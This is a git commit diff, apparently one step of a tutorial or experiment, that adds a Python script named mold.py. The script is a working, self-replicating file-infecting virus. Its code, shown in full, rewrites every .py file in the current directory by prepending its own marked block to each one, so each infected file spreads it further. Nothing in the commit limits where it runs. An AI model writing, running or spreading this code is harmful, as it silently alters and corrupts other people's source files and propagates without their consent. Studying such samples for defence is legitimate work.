2f52f47bf7088aa020c77582c1f3d12ceacac8f0
Wizard of z/OS <wizard@zdevops.com>
2019-04-08 21:49:38 +0200

    Some comments, go self-replicating

---
+++ step02/mold.py
@@ -0,0 +1,85 @@
+# PIEMOLDER:START
+
+def execute(virus):
+	import glob
+	import os
+	allpies = glob.glob("*.py")
+
+	for py in allpies:
+		thepie = open(py, "r")
+		rottenpie = open("%s.rotten" % py, "w")
+
+		rottenpie.write(virus)
+
+		for line in thepie.readlines():
+			rottenpie.write(line)
+
+		thepie.close()
+		rottenpie.close()
+
+		os.remove(py)
+		os.rename("%s.rotten" % py, py)
+
+
+import os
+virus = os.path.basename(__file__)
+vfile = open(virus, "r")
+copyover = False
+vstring = ""
+for line in vfile.readlines():
+	if line.find("# PIEMOLDER:START") == 0:
+		copyover = True
+	if line.find("# PIEMOLDER:END") == 0:
+		copyover = False
+	if copyover:
+		vstring += line
+
+execute(vstring)
+
+
+# Let's make it self-replicating...
+
+
+# PIEMOLDER:START
+
+def execute(virus):
+	import glob
+	import os
+	allpies = glob.glob("*.py")
+
+	for py in allpies:
+		thepie = open(py, "r")
+		rottenpie = open("%s.rotten" % py, "w")
+
+		rottenpie.write(virus)
+
+		for line in thepie.readlines():
+			rottenpie.write(line)
+
+		thepie.close()
+		rottenpie.close()
+
+		os.remove(py)
+		os.rename("%s.rotten" % py, py)
+
+
+import os
+virus = os.path.basename(__file__)
+vfile = open(virus, "r")
+copyover = False
+vstring = ""
+for line in vfile.readlines():
+	if line.find("# PIEMOLDER:START") == 0:
+		copyover = True
+	if line.find("# PIEMOLDER:END") == 0:
+		copyover = False
+	if copyover:
+		vstring += line
+
+execute(vstring)
+
+
+# PIEMOLDER:END
+
+
+
